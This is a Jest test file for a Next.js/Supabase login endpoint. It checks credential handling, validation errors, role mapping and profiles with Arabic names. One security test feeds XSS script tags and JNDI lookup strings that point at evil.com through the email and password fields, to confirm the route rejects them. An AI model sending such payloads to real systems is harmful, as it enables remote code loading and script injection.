import { NextRequest } from 'next/server'
import { POST } from '@/app/api/auth/login/route'
import { createServerSupabaseClient } from '@/lib/supabase'
import { SAMPLE_USER_DATA } from '../../../fixtures/islamic-content'

// Mock the supabase client
jest.mock('@/lib/supabase')

const mockSupabase = {
  auth: {
    signInWithPassword: jest.fn(),
  },
  from: jest.fn(() => ({
    select: jest.fn().mockReturnThis(),
    eq: jest.fn().mockReturnThis(),
    single: jest.fn(),
  })),
}

const mockCreateServerSupabaseClient = createServerSupabaseClient as jest.MockedFunction<typeof createServerSupabaseClient>

describe('/api/auth/login', () => {
  beforeEach(() => {
    jest.clearAllMocks()
    mockCreateServerSupabaseClient.mockReturnValue(mockSupabase as any)
  })

  describe('POST /api/auth/login', () => {
    it('should login successfully with valid credentials', async () => {
      const requestData = {
        email: 'test@example.com',
        password: 'validpassword123'
      }

      const mockAuthResponse = {
        data: {
          user: { id: 'user-123', email: 'test@example.com' },
          session: {
            access_token: 'mock-access-token',
            refresh_token: 'mock-refresh-token',
            expires_at: Date.now() / 1000 + 3600
          }
        },
        error: null
      }

      const mockUserData = {
        ...SAMPLE_USER_DATA.user,
        id: 'user-123',
        email: 'test@example.com'
      }

      mockSupabase.auth.signInWithPassword.mockResolvedValueOnce(mockAuthResponse)
      
      const mockFromChain = mockSupabase.from()
      mockFromChain.single.mockResolvedValueOnce({
        data: mockUserData,
        error: null
      })

      const request = new NextRequest('http://localhost:3000/api/auth/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(requestData)
      })

      const response = await POST(request)
      const responseBody = await response.json()

      expect(response.status).toBe(200)
      expect(responseBody.success).toBe(true)
      expect(responseBody.data.user.email).toBe('test@example.com')
      expect(responseBody.data.session.access_token).toBe('mock-access-token')
      expect(responseBody.data.message).toBe('Login successful')

      expect(mockSupabase.auth.signInWithPassword).toHaveBeenCalledWith({
        email: 'test@example.com',
        password: 'validpassword123'
      })
    })

    it('should return 401 for invalid credentials', async () => {
      const requestData = {
        email: 'test@example.com',
        password: 'wrongpassword'
      }

      mockSupabase.auth.signInWithPassword.mockResolvedValueOnce({
        data: { user: null },
        error: { message: 'Invalid login credentials' }
      })

      const request = new NextRequest('http://localhost:3000/api/auth/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(requestData)
      })

      const response = await POST(request)
      const responseBody = await response.json()

      expect(response.status).toBe(401)
      expect(responseBody.success).toBe(false)
      expect(responseBody.error).toBe('Invalid login credentials')
    })

    it('should return 400 for invalid email format', async () => {
      const requestData = {
        email: 'invalid-email',
        password: 'validpassword123'
      }

      const request = new NextRequest('http://localhost:3000/api/auth/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(requestData)
      })

      const response = await POST(request)
      const responseBody = await response.json()

      expect(response.status).toBe(400)
      expect(responseBody.success).toBe(false)
      expect(responseBody.error).toBe('Validation failed')
      expect(responseBody.details).toBeDefined()
      expect(responseBody.details[0].message).toBe('Invalid email format')
    })

    it('should return 400 for missing password', async () => {
      const requestData = {
        email: 'test@example.com',
        password: ''
      }

      const request = new NextRequest('http://localhost:3000/api/auth/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(requestData)
      })

      const response = await POST(request)
      const responseBody = await response.json()

      expect(response.status).toBe(400)
      expect(responseBody.success).toBe(false)
      expect(responseBody.error).toBe('Validation failed')
      expect(responseBody.details[0].message).toBe('Password is required')
    })

    it('should return 400 for malformed JSON', async () => {
      const request = new NextRequest('http://localhost:3000/api/auth/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: 'invalid json'
      })

      const response = await POST(request)
      const responseBody = await response.json()

      expect(response.status).toBe(500)
      expect(responseBody.success).toBe(false)
      expect(responseBody.error).toBe('Internal server error')
    })

    it('should return 500 when user profile fetch fails', async () => {
      const requestData = {
        email: 'test@example.com',
        password: 'validpassword123'
      }

      const mockAuthResponse = {
        data: {
          user: { id: 'user-123', email: 'test@example.com' },
          session: { access_token: 'token', refresh_token: 'refresh' }
        },
        error: null
      }

      mockSupabase.auth.signInWithPassword.mockResolvedValueOnce(mockAuthResponse)
      
      const mockFromChain = mockSupabase.from()
      mockFromChain.single.mockResolvedValueOnce({
        data: null,
        error: { message: 'User profile not found' }
      })

      const request = new NextRequest('http://localhost:3000/api/auth/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(requestData)
      })

      const response = await POST(request)
      const responseBody = await response.json()

      expect(response.status).toBe(500)
      expect(responseBody.success).toBe(false)
      expect(responseBody.error).toBe('Failed to fetch user profile')
    })

    it('should return 401 when authentication succeeds but user is null', async () => {
      const requestData = {
        email: 'test@example.com',
        password: 'validpassword123'
      }

      mockSupabase.auth.signInWithPassword.mockResolvedValueOnce({
        data: { user: null, session: null },
        error: null
      })

      const request = new NextRequest('http://localhost:3000/api/auth/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(requestData)
      })

      const response = await POST(request)
      const responseBody = await response.json()

      expect(response.status).toBe(401)
      expect(responseBody.success).toBe(false)
      expect(responseBody.error).toBe('Authentication failed')
    })

    it('should handle various user roles correctly', async () => {
      const testCases = [
        { userData: SAMPLE_USER_DATA.user, expectedRole: 'user' },
        { userData: SAMPLE_USER_DATA.moderator, expectedRole: 'moderator' },
        { userData: SAMPLE_USER_DATA.admin, expectedRole: 'admin' }
      ]

      for (const testCase of testCases) {
        const requestData = {
          email: testCase.userData.email,
          password: 'validpassword123'
        }

        const mockAuthResponse = {
          data: {
            user: { id: testCase.userData.id, email: testCase.userData.email },
            session: { access_token: 'token', refresh_token: 'refresh' }
          },
          error: null
        }

        mockSupabase.auth.signInWithPassword.mockResolvedValueOnce(mockAuthResponse)
        
        const mockFromChain = mockSupabase.from()
        mockFromChain.single.mockResolvedValueOnce({
          data: testCase.userData,
          error: null
        })

        const request = new NextRequest('http://localhost:3000/api/auth/login', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(requestData)
        })

        const response = await POST(request)
        const responseBody = await response.json()

        expect(response.status).toBe(200)
        expect(responseBody.data.user.role).toBe(testCase.expectedRole)
        
        // Reset mocks for next iteration
        jest.clearAllMocks()
        mockCreateServerSupabaseClient.mockReturnValue(mockSupabase as any)
      }
    })

    it('should handle unexpected errors gracefully', async () => {
      const requestData = {
        email: 'test@example.com',
        password: 'validpassword123'
      }

      mockSupabase.auth.signInWithPassword.mockRejectedValueOnce(new Error('Network error'))

      const consoleSpy = jest.spyOn(console, 'error').mockImplementation()

      const request = new NextRequest('http://localhost:3000/api/auth/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(requestData)
      })

      const response = await POST(request)
      const responseBody = await response.json()

      expect(response.status).toBe(500)
      expect(responseBody.success).toBe(false)
      expect(responseBody.error).toBe('Internal server error')
      expect(consoleSpy).toHaveBeenCalledWith('Login error:', expect.any(Error))

      consoleSpy.mockRestore()
    })
  })

  describe('Authentication Security', () => {
    it('should not expose sensitive information in error responses', async () => {
      const requestData = {
        email: 'test@example.com',
        password: 'wrongpassword'
      }

      mockSupabase.auth.signInWithPassword.mockResolvedValueOnce({
        data: { user: null },
        error: { message: 'Invalid login credentials' }
      })

      const request = new NextRequest('http://localhost:3000/api/auth/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(requestData)
      })

      const response = await POST(request)
      const responseBody = await response.json()

      expect(responseBody).not.toHaveProperty('password')
      expect(responseBody).not.toHaveProperty('session.access_token')
      expect(responseBody.error).toBe('Invalid login credentials')
    })

    it('should validate input thoroughly', async () => {
      const maliciousInputs = [
        { email: '<script>alert("xss")</script>@example.com', password: 'password' },
        { email: 'test@example.com', password: '<script>alert("xss")</script>' },
        { email: '${jndi:ldap://evil.com}@example.com', password: 'password' },
        { email: 'test@example.com', password: '${jndi:ldap://evil.com}' },
      ]

      for (const maliciousInput of maliciousInputs) {
        const request = new NextRequest('http://localhost:3000/api/auth/login', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(maliciousInput)
        })

        const response = await POST(request)
        const responseBody = await response.json()

        // Should either validate properly or return validation error
        expect([200, 400, 401]).toContain(response.status)
        if (response.status === 200) {
          // If validation passes, ensure supabase is called with clean data
          expect(mockSupabase.auth.signInWithPassword).toHaveBeenCalled()
        }

        jest.clearAllMocks()
        mockCreateServerSupabaseClient.mockReturnValue(mockSupabase as any)
      }
    })

    it('should handle rate limiting scenarios gracefully', async () => {
      const requestData = {
        email: 'test@example.com',
        password: 'validpassword123'
      }

      mockSupabase.auth.signInWithPassword.mockResolvedValueOnce({
        data: { user: null },
        error: { message: 'Rate limit exceeded' }
      })

      const request = new NextRequest('http://localhost:3000/api/auth/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(requestData)
      })

      const response = await POST(request)
      const responseBody = await response.json()

      expect(response.status).toBe(401)
      expect(responseBody.success).toBe(false)
      expect(responseBody.error).toBe('Rate limit exceeded')
    })
  })

  describe('Islamic Content Integration', () => {
    it('should properly handle Islamic user profiles with Arabic names', async () => {
      const islamicUserData = {
        id: 'islamic-user-123',
        email: 'abdullah@example.com',
        role: 'user',
        created_at: '2024-01-01T00:00:00Z',
        profile: {
          display_name: 'عبد الله محمد',
          preferred_language: 'ar',
          study_level: 'intermediate',
          daily_goal: 10,
          streak_count: 15,
          total_questions_answered: 150,
          correct_answers: 120
        }
      }

      const requestData = {
        email: 'abdullah@example.com',
        password: 'validpassword123'
      }

      const mockAuthResponse = {
        data: {
          user: { id: 'islamic-user-123', email: 'abdullah@example.com' },
          session: { access_token: 'token', refresh_token: 'refresh' }
        },
        error: null
      }

      mockSupabase.auth.signInWithPassword.mockResolvedValueOnce(mockAuthResponse)
      
      const mockFromChain = mockSupabase.from()
      mockFromChain.single.mockResolvedValueOnce({
        data: islamicUserData,
        error: null
      })

      const request = new NextRequest('http://localhost:3000/api/auth/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(requestData)
      })

      const response = await POST(request)
      const responseBody = await response.json()

      expect(response.status).toBe(200)
      expect(responseBody.data.user.profile.display_name).toBeValidArabicText()
      expect(responseBody.data.user.profile.preferred_language).toBe('ar')
      expect(responseBody.data.user.profile.study_level).toBe('intermediate')
    })

    it('should handle users with different Islamic study levels', async () => {
      const studyLevels = ['beginner', 'intermediate', 'advanced', 'scholar']
      
      for (const level of studyLevels) {
        const userData = {
          ...SAMPLE_USER_DATA.user,
          profile: {
            ...SAMPLE_USER_DATA.user.profile,
            study_level: level
          }
        }

        const requestData = {
          email: userData.email,
          password: 'validpassword123'
        }

        const mockAuthResponse = {
          data: {
            user: { id: userData.id, email: userData.email },
            session: { access_token: 'token', refresh_token: 'refresh' }
          },
          error: null
        }

        mockSupabase.auth.signInWithPassword.mockResolvedValueOnce(mockAuthResponse)
        
        const mockFromChain = mockSupabase.from()
        mockFromChain.single.mockResolvedValueOnce({
          data: userData,
          error: null
        })

        const request = new NextRequest('http://localhost:3000/api/auth/login', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(requestData)
        })

        const response = await POST(request)
        const responseBody = await response.json()

        expect(response.status).toBe(200)
        expect(responseBody.data.user.profile.study_level).toBe(level)
        
        jest.clearAllMocks()
        mockCreateServerSupabaseClient.mockReturnValue(mockSupabase as any)
      }
    })
  })
})